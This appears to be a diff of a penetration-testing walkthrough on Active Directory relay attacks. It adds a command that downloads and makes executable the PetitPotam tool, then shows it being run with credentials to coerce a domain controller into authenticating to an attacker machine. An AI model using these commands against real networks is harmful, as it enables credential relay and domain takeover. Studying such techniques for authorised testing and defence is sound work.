@@ -10,5 +10,7 @@ First we have to set "off" SMB and HTTP protocols on "responder.conf" file.
 
 Trigger PetitPotam
 
+  $ wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py && chmod +x PetitPotam.py
+
   $ python3 PetitPotam.py -u <username> -p <password> -d domain.local <kaliIP> <dcIP>
   
